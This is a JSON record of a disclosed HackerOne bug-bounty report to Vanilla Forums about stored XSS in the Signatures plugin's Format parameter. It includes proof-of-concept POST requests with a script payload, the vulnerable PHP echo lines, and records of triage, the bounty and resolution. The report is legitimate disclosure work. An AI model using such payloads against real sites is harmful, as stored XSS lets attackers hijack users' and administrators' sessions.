{"id":413828,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTM4Mjg=","url":"https://hackerone.com/reports/413828","title":"Persistent XSS via Signatures","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-09-25T10:58:11.176Z","submitted_at":"2018-09-25T10:58:11.176Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"foobar7","url":"/foobar7","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17443,"url":"https://hackerone.com/vanilla","handle":"vanilla","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Vanilla","twitter_handle":"vanilla","website":"http://vanillaforums.com","about":"Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-06T11:17:06.471Z","bug_reporter_agreed_on_going_public_at":"2019-03-07T11:17:06.289Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n-----------\n\nThe current version of the signature plugin (1.6.1) is vulnerable to persistent XSS as the `Format` parameter is echoed without encoding. \n\nPOC\n---\n\nPrerequisite: Enable the Signatures plugin\n\nTo place the payload, the following request can be used (it's simply the request that is send when changing a signature, with an XSS payload in the `Format` parameter):\n\n    POST /vanilla-2.6.1/profile/signature HTTP/1.1\n    [...]\n\n    TransientKey=[...]\u0026hpt=\u0026Format=html'\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u0026Body=signature\u0026Checkboxes%5B%5D=Plugin.Signatures.HideAll\u0026Checkboxes%5B%5D=Plugin.Signatures.HideImages\u0026Save=Save\n\nTo trigger the payload, simply view a post by the user with a malicious signature.\n\nCode\n----\n\n    /plugins/Signatures/class.signatures.plugin.php\n    $userSignature = Gdn_Format::to($signature, $sigFormat).\"\u003c!-- $sigFormat --\u003e\";\n    [...]\n    echo \"\u003cdiv class=\\\"Signature UserSignature userContent {$sigClasses}\\\"\u003e{$userSignature}\u003c/div\u003e\n\n## Impact\n\nSuccessful exploitation allows an attacker to read any data the attacked user has access to, or to perform arbitrary requests the user can perform.\n\nIf the attacked user is an administrator, the attacker could for example add a new admin user and thus gain full access to the application.","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eThe current version of the signature plugin (1.6.1) is vulnerable to persistent XSS as the \u003ccode\u003eFormat\u003c/code\u003e parameter is echoed without encoding. \u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePOC\u003c/h2\u003e\n\n\u003cp\u003ePrerequisite: Enable the Signatures plugin\u003c/p\u003e\n\n\u003cp\u003eTo place the payload, the following request can be used (it\u0026#39;s simply the request that is send when changing a signature, with an XSS payload in the \u003ccode\u003eFormat\u003c/code\u003e parameter):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /vanilla-2.6.1/profile/signature HTTP/1.1\n[...]\n\nTransientKey=[...]\u0026amp;hpt=\u0026amp;Format=html\u0026#39;\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026amp;Body=signature\u0026amp;Checkboxes%5B%5D=Plugin.Signatures.HideAll\u0026amp;Checkboxes%5B%5D=Plugin.Signatures.HideImages\u0026amp;Save=Save\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo trigger the payload, simply view a post by the user with a malicious signature.\u003c/p\u003e\n\n\u003ch2 id=\"code\"\u003eCode\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/plugins/Signatures/class.signatures.plugin.php\n$userSignature = Gdn_Format::to($signature, $sigFormat).\u0026quot;\u0026lt;!-- $sigFormat --\u0026gt;\u0026quot;;\n[...]\necho \u0026quot;\u0026lt;div class=\\\u0026quot;Signature UserSignature userContent {$sigClasses}\\\u0026quot;\u0026gt;{$userSignature}\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eSuccessful exploitation allows an attacker to read any data the attacked user has access to, or to perform arbitrary requests the user can perform.\u003c/p\u003e\n\n\u003cp\u003eIf the attacked user is an administrator, the attacker could for example add a new admin user and thus gain full access to the application.\u003c/p\u003e\n","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-04-06T11:17:06.360Z","allow_singular_disclosure_after":-54671820.197513126,"singular_disclosure_allowed":true,"vote_count":28,"voters":["sameerphad72","youngsheldon","mygf","eveeez","an0nym0us","hassanshahid","khizer47","bb00x","termi1","cryptographer","and 18 more..."],"severity":{"rating":"high","score":8.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":2101,"asset_type":"URL","asset_identifier":"*.vanillaforums.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3384551,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, I accidentally posted an old request. A working POC should use the payload `html--\u003e\u003cscript\u003ealert(1)\u003c/script\u003e` (the HTML comment must be closed). The correct request would be:\n\n    POST /vanilla-2.6.1/profile/signature HTTP/1.1\n    [...]\n\n    TransientKey=[...]\u0026hpt=\u0026Format=html--\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u0026Body=signature\u0026Checkboxes%5B%5D=Plugin.Signatures.HideAll\u0026Checkboxes%5B%5D=Plugin.Signatures.HideImages\u0026Save=Save\n","markdown_message":"\u003cp\u003eSorry, I accidentally posted an old request. A working POC should use the payload \u003ccode\u003ehtml--\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u003c/code\u003e (the HTML comment must be closed). The correct request would be:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /vanilla-2.6.1/profile/signature HTTP/1.1\n[...]\n\nTransientKey=[...]\u0026amp;hpt=\u0026amp;Format=html--\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026amp;Body=signature\u0026amp;Checkboxes%5B%5D=Plugin.Signatures.HideAll\u0026amp;Checkboxes%5B%5D=Plugin.Signatures.HideImages\u0026amp;Save=Save\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-09-25T11:02:37.370Z","updated_at":"2018-09-25T11:02:37.370Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3385032,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-25T13:24:19.888Z","updated_at":"2018-09-25T13:24:19.888Z","additional_data":{"old_severity":"High","new_severity":"High (8.6)","old_severity_id":214244,"new_severity_id":214296},"actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3385037,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-25T13:25:12.529Z","updated_at":"2018-09-25T13:25:12.529Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3385039,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!","markdown_message":"\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-25T13:25:27.227Z","updated_at":"2018-09-25T13:25:27.227Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3385051,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-25T13:26:35.717Z","updated_at":"2018-09-25T13:26:35.717Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"vanilla","collaborator":{"username":"foobar7","url":"/foobar7"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3385098,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the quick triage and bounty!","markdown_message":"\u003cp\u003eThanks for the quick triage and bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-25T13:38:10.973Z","updated_at":"2018-09-25T13:38:10.973Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4124288,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-11T00:40:36.077Z","updated_at":"2019-02-11T00:40:36.077Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"foobar7","url":"/foobar7"},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4274683,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-07T11:17:06.322Z","updated_at":"2019-03-07T11:17:06.322Z","first_to_agree":true,"actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4497901,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-06T11:17:06.580Z","updated_at":"2019-04-06T11:17:06.580Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}